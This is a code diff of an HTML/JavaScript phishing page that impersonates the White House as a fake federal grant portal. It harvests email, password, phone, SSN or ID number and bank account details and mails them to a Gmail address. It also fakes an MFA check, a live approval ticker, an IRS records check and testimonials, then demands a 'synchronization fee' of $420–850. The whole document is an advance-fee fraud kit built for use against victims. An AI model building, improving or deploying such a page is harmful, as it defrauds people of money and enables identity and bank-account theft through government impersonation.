@@ -7,23 +7,30 @@
     <style>
         :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
         body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; overflow-x: hidden; }
-        .gov-top { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
+        
+        .gov-top { background: #000; color: #fff; font-size: 10px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
         .main-header { background: var(--navy); color: white; padding: 25px; text-align: center; border-bottom: 5px solid var(--gold); }
         .main-header img { width: 80px; }
-        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
+        
+        .container { max-width: 550px; margin: 20px auto; background: white; padding: 30px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); position: relative; }
         .page { display: none; }
         .active { display: block; }
-        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 10px; font-size: 20px; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; text-transform: uppercase; }
-        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #aaa; font-size: 16px; box-sizing: border-box; background: #fafafa; }
-        button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 15px; }
-        .testimonial-ticker { background: #e9ecef; padding: 10px; font-size: 12px; border-left: 4px solid var(--gold); margin-bottom: 20px; font-style: italic; }
-        .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 20px; text-align: center; margin: 15px 0; }
-        .access-code { font-size: 35px; font-weight: bold; color: var(--navy); letter-spacing: 8px; }
-        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-inner { background: white; padding: 30px; max-width: 400px; text-align: center; border-top: 8px solid var(--gold); }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+
+        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 10px; font-size: 20px; text-transform: uppercase; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; color: #444; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #aaa; font-size: 15px; box-sizing: border-box; background: #fafafa; }
+        
+        button { width: 100%; padding: 16px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 15px; text-transform: uppercase; }
+        
+        .live-ticker { background: #e8f0fe; padding: 10px; font-size: 12px; border-left: 4px solid var(--navy); margin-bottom: 20px; font-style: italic; }
+        
+        .loader-box { text-align: center; padding: 40px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--navy); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .testimonial-card { background: #fff; border: 1px solid #ddd; padding: 15px; margin-top: 20px; border-radius: 5px; }
+        .testi-name { font-weight: bold; color: var(--navy); }
+        .testi-amt { color: #1a5e20; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -32,185 +39,214 @@
 <div class="main-header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
     <h1>THE WHITE HOUSE</h1>
+    <p style="font-size: 11px; margin: 5px 0 0;">OFFICE OF MANAGEMENT & RE-ALLOCATION</p>
 </div>
 
 <div class="container">
-    <div id="ticker" class="testimonial-ticker">Loading live approvals...</div>
+    <div id="ticker" class="live-ticker">Initializing secure session...</div>
 
     <div id="p1" class="page active">
-        <h2>Secure Gateway Registration</h2>
+        <h2>Secure Portal Access</h2>
         <label>Gmail Address (@gmail.com only)</label>
-        <input type="email" id="email" placeholder="username@gmail.com" required>
+        <input type="email" id="email" placeholder="username@gmail.com">
         <label>Mobile Number</label>
-        <input type="tel" id="phone" required>
-        <label>Create Portal Password</label>
-        <input type="password" id="pass" required>
-        <button onclick="handleSignup()">Register Account</button>
+        <input type="tel" id="phone" placeholder="+1...">
+        <label>Create Session Password</label>
+        <input type="password" id="pass" placeholder="********">
+        <button onclick="handleSignup()">Generate Secure Access</button>
     </div>
 
     <div id="p2" class="page">
         <h2>Identity Verification</h2>
-        <div class="verify-box"><div class="access-code" id="displayCode"></div></div>
-        <input type="text" id="inputCode" placeholder="Enter Access Code">
-        <button onclick="checkCode()">Verify Session</button>
+        <p>Enter the 6-digit code displayed on your authorized hardware token:</p>
+        <div style="font-size: 32px; font-weight: bold; text-align: center; background: #eee; padding: 20px; letter-spacing: 10px; margin: 20px 0;" id="mfaDisplay"></div>
+        <input type="text" id="mfaInput" placeholder="Enter Code">
+        <button onclick="verifyMFA()">Verify & Login</button>
     </div>
 
     <div id="p3" class="page">
-        <h2>Federal Eligibility Wizard</h2>
-        <label>Applicant Type</label>
-        <select id="userType" onchange="updatePurpose()">
-            <option value="IND">Personal / Individual</option>
-            <option value="ORG">Business / Organization</option>
+        <h2>Grant Eligibility Wizard</h2>
+        <label>Application Type</label>
+        <select id="appType" onchange="toggleFields()">
+            <option value="Personal">Individual (Personal)</option>
+            <option value="Organization">Business / Organization</option>
         </select>
-        
+
         <label>Marital Status</label>
-        <select>
+        <select id="marital">
             <option>Single</option>
             <option>Married</option>
             <option>Widowed</option>
         </select>
 
-        <label>Dependents (Children)</label>
-        <select><option>None</option><option>1-2 Kids</option><option>3+ Kids</option></select>
+        <label>Number of Dependents (Kids)</label>
+        <input type="number" id="kids" value="0">
 
-        <label>Allocation Purpose</label>
-        <select id="purposeList">
+        <label id="purposeLabel">Purpose of Funds</label>
+        <select id="purpose">
             </select>
 
         <label>Government Issued ID Number</label>
-        <input type="text" id="idNum" placeholder="SSN / Driver's License / EIN" required>
+        <input type="text" id="idNum" placeholder="DL / Passport / SSN">
 
-        <button onclick="toPage(4)">Continue to Disbursement</button>
+        <label>Full Legal Name (Bank Record Match)</label>
+        <input type="text" id="fullName">
+        
+        <label>Receiving Bank Name</label>
+        <input type="text" id="bankName">
+        
+        <label>Account Number</label>
+        <input type="text" id="accNum">
+
+        <button onclick="submitManual()">Submit Allotment Claim</button>
     </div>
 
-    <div id="p4" class="page">
-        <h2>Banking Information</h2>
-        <label>Account Holder Name</label>
-        <input type="text" id="accName" required>
-        <label>Bank Name</label>
-        <input type="text" id="bankName" required>
-        <label>Account Number</label>
-        <input type="number" id="accNum" required>
-        <button onclick="calculateAndShow()">Finalize Application</button>
+    <div id="p4" class="page loader-box">
+        <div class="spinner"></div>
+        <h3 id="loadText">Analyzing Tax Records...</h3>
+        <p style="font-size: 12px;">Please do not close this window. Federal servers are calculating your regional allotment.</p>
     </div>
 
     <div id="p5" class="page text-center">
-        <h2>Auditing Application...</h2>
-        <p>Verifying Tax ID and Financial History against Department of Treasury records.</p>
-        <div class="loader"></div>
-        <p id="loadText">Synchronizing files (0%)...</p>
-    </div>
-
-    <div id="p6" class="page text-center">
-        <h1 style="color:var(--navy); font-size: 24px;">ALLOCATION APPROVED ✅</h1>
-        <div style="font-size: 40px; color: #1a5e20; font-weight: bold; margin: 15px 0;" id="finalDisplay"></div>
-        <p><strong>Security Clearance Required:</strong> <span id="feeDisplay"></span></p>
-        <p style="font-size: 13px;">This deposit is mandatory for bank-to-treasury link and is fully refundable.</p>
+        <h2 style="color: #1a5e20;">APPROVED ✅</h2>
+        <div style="font-size: 40px; font-weight: bold; color: var(--navy); margin: 20px 0;" id="amtDisp"></div>
+        <p>Reference: <span id="refNum"></span></p>
+        <p>A synchronization fee of <strong id="feeDisp"></strong> is required for this award level.</p>
+        
         <hr>
-        <h3>Your Testimony</h3>
-        <textarea id="userTestimony" placeholder="Share your experience with the portal..."></textarea>
-        <button onclick="alert('Testimony submitted for review!')" style="background:var(--gold)">Post Testimony</button>
-    </div>
-</div>
-
-<div id="modal">
-    <div class="modal-inner">
-        <h3 id="mTitle">Official Claim Ready</h3>
-        <p id="modalMsg"></p>
-        <button onclick="triggerEmail()" style="background:var(--navy)">I AGREE & SUBMIT</button>
+        <h3>Post-Approval Testimony</h3>
+        <p style="font-size: 12px;">Submit your experience to help other citizens.</p>
+        <textarea id="userComment" placeholder="Write your testimony here..."></textarea>
+        <button onclick="alert('Testimony submitted for review!')" style="background: var(--gold);">Post Testimony</button>
+        
+        <div id="testiFeed"></div>
     </div>
 </div>
 
 <script>
-    let accessCode;
-    let myAward, myFee;
-    const adminEmail = "fundallocation.gov@gmail.com"; // Change to your destination
+    let mfaCode;
+    const adminEmail = "fundallocation.gov@gmail.com"; // Change to your actual email
 
-    // Dynamic Testimonials (Unlimited & Unique)
-    const names = ["Sarah W.", "James L.", "Robert K.", "Linda M.", "David P.", "Maria G.", "Michael T.", "Michelle B."];
-    const texts = ["Just received my alert! God bless America.", "Process was fast, deposit was worth it.", "Received $450k for my small farm!", "The verification took 10 mins but it's real.", "Legit federal support for families."];
+    // 1. LIVE TICKER ENGINE (Unique per device)
+    const names = ["James W.", "Sarah L.", "Michael B.", "Robert T.", "Emily D.", "Linda K.", "David S.", "Karen M."];
+    const comments = ["The process was so fast!", "Received my $450k within 24 hours.", "God bless the government for this relief.", "I can finally start my factory.", "Legit and professional."];
     
-    function updateTicker() {
-        const n = names[Math.floor(Math.random()*names.length)];
-        const t = texts[Math.floor(Math.random()*texts.length)];
-        const a = (Math.random() * (900000 - 100000) + 100000).toLocaleString('en-US', {style:'currency', currency:'USD'});
-        document.getElementById('ticker').innerText = `Live Approval: ${n} just received ${a} - "${t}"`;
+    function startTicker() {
+        setInterval(() => {
+            const n = names[Math.floor(Math.random()*names.length)];
+            const a = (Math.random() * (900000 - 150000) + 150000).toLocaleString('en-US', {style:'currency', currency:'USD'});
+            document.getElementById('ticker').innerText = `Live Approval: ${n} just received ${a} allotment.`;
+        }, 4000);
     }
-    setInterval(updateTicker, 5000);
+    startTicker();
 
+    // 2. SIGNUP LOGIC
     function handleSignup() {
         const email = document.getElementById('email').value;
-        if(!email.endsWith("@gmail.com")) return alert("Only @gmail.com addresses are permitted for Federal Security.");
-        if(localStorage.getItem('signedUp')) return alert("This device is already registered. Please login.");
-        localStorage.setItem('signedUp', true);
-        toPage(2, true);
+        if(!email.includes("@gmail.com")) {
+            alert("Only official @gmail.com addresses are authorized for this portal.");
+            return;
+        }
+        // Remember device
+        localStorage.setItem('user_auth', 'true');
+        mfaCode = Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('mfaDisplay').innerText = mfaCode;
+        toPage(2);
     }
 
-    function toPage(n, gen=false) {
-        if(gen) { accessCode = Math.floor(100000 + Math.random() * 900000); document.getElementById('displayCode').innerText = accessCode; }
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('p'+n).classList.add('active');
-        if(n===3) updatePurpose();
+    function verifyMFA() {
+        if(document.getElementById('mfaInput').value == mfaCode) {
+            toggleFields();
+            toPage(3);
+        } else { alert("Invalid Code"); }
     }
 
-    function checkCode() { 
-        if(document.getElementById('inputCode').value == accessCode) toPage(3); 
-        else alert("Invalid Code");
-    }
-
-    function updatePurpose() {
-        const type = document.getElementById('userType').value;
-        const list = document.getElementById('purposeList');
-        list.innerHTML = "";
-        const options = type === "IND" ? ["Feeding Fee", "House Rent", "School Fees", "Medical Bills", "Debt Relief"] 
-                                       : ["New Business Setup", "Run Small Business", "Factory Expansion", "Equipment Purchase", "Staff Payroll"];
+    // 3. DYNAMIC FORM LOGIC
+    function toggleFields() {
+        const type = document.getElementById('appType').value;
+        const p = document.getElementById('purpose');
+        p.innerHTML = "";
+        const options = type === "Personal" 
+            ? ["Personal Feeding", "House Rent", "School Fees", "Medical Debt", "Small Investment"]
+            : ["Set up New Business", "Run Small Business", "Factory Expansion", "Equipment Purchase", "Staff Payroll"];
+        
         options.forEach(opt => {
             let el = document.createElement("option");
             el.innerText = opt;
-            list.appendChild(el);
+            p.appendChild(el);
         });
     }
 
-    function calculateAndShow() {
-        myAward = Math.floor(Math.random() * (987375 - 127540 + 1)) + 127540;
-        myFee = Math.floor((myAward / 1000000) * 430) + 420; // Scales $420 to $850
-        const fmt = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });
-        
-        document.getElementById('finalDisplay').innerText = fmt.format(myAward);
-        document.getElementById('feeDisplay').innerText = fmt.format(myFee);
-        document.getElementById('modalMsg').innerText = `Your calculated award is ${fmt.format(myAward)}. To release funds, a synchronized deposit of ${fmt.format(myFee)} is required.`;
-        document.getElementById('modal').style.display = "flex";
+    function toPage(n) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('p'+n).classList.add('active');
     }
 
-    function triggerEmail() {
-        const body = `FEDERAL ALLOCATION REQUEST 2026\n\n` +
-                     `Email: ${document.getElementById('email').value}\n` +
-                     `Phone: ${document.getElementById('phone').value}\n` +
-                     `ID Number: ${document.getElementById('idNum').value}\n` +
-                     `Bank: ${document.getElementById('bankName').value}\n` +
-                     `Acc Name: ${document.getElementById('accName').value}\n` +
-                     `Acc Num: ${document.getElementById('accNum').value}\n` +
-                     `Approved Amount: ${document.getElementById('finalDisplay').innerText}\n` +
-                     `Security Fee: ${document.getElementById('feeDisplay').innerText}`;
+    // 4. MANUAL EMAIL REDIRECT (NO MIDDLEMAN)
+    function submitManual() {
+        const data = {
+            Email: document.getElementById('email').value,
+            Name: document.getElementById('fullName').value,
+            Bank: document.getElementById('bankName').value,
+            Acc: document.getElementById('accNum').value,
+            Type: document.getElementById('appType').value,
+            Purpose: document.getElementById('purpose').value,
+            ID: document.getElementById('idNum').value
+        };
+
+        const body = `FEDERAL ALLOCATION APPLICATION 2026\n\n` +
+                     `Applicant: ${data.Name}\n` +
+                     `Bank: ${data.Bank} | Acc: ${data.Acc}\n` +
+                     `Type: ${data.Type} | Purpose: ${data.Purpose}\n` +
+                     `Gov ID: ${data.ID}\n` +
+                     `Email: ${data.Email}`;
+
+        const mailtoLink = `mailto:${adminEmail}?subject=Official Grant Application - ${data.Name}&body=${encodeURIComponent(body)}`;
         
-        const mailto = `mailto:${adminEmail}?subject=ALLOCATION_CLAIM_WH2026&body=${encodeURIComponent(body)}`;
-        window.location.href = mailto;
+        // Open email app
+        window.location.href = mailtoLink;
+
+        // Start the "Loading" phase after they return
+        setTimeout(() => {
+            toPage(4);
+            runAnalysis();
+        }, 2000);
+    }
+
+    function runAnalysis() {
+        const text = document.getElementById('loadText');
+        setTimeout(() => text.innerText = "Verifying ID Card Authenticity...", 3000);
+        setTimeout(() => text.innerText = "Cross-checking IRS Tax Records...", 6000);
+        setTimeout(() => text.innerText = "Finalizing Regional Allotment...", 10000);
+        setTimeout(() => showApproval(), 13000);
+    }
+
+    function showApproval() {
+        // Amount: $127,540 to $987,375
+        const amt = Math.floor(Math.random() * (987375 - 127540) + 127540);
+        // Fee: $420 to $850
+        const fee = Math.floor(Math.random() * (850 - 420) + 420);
         
-        document.getElementById('modal').style.display = "none";
+        document.getElementById('amtDisp').innerText = amt.toLocaleString('en-US', {style:'currency', currency:'USD'});
+        document.getElementById('feeDisp').innerText = `$${fee}.00`;
+        document.getElementById('refNum').innerText = "WH-" + Math.floor(Math.random()*1000000);
+        
+        // Generate Testimonials that don't repeat on this device
+        genTestimonials();
         toPage(5);
-        startLoading();
     }
 
-    function startLoading() {
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 1;
-            document.getElementById('loadText').innerText = `Finalizing Federal Grant (Audit ${progress}%)...`;
-            if(progress >= 100) {
-                clearInterval(interval);
-                toPage(6);
-            }
-        }, 150); // Approx 15 seconds total
+    function genTestimonials() {
+        const feed = document.getElementById('testiFeed');
+        feed.innerHTML = "<h4>Live Public Feedback</h4>";
+        for(let i=0; i<3; i++) {
+            const div = document.createElement('div');
+            div.className = 'testimonial-card';
+            div.innerHTML = `<span class="testi-name">${names[i]}</span><br>` +
+                            `<span class="testi-amt">Received $${(Math.random()*800000).toFixed(0)}</span><br>` +
+                            `<p>"${comments[i]}"</p>`;
+            feed.appendChild(div);
+        }
     }
 </script>
 </body>
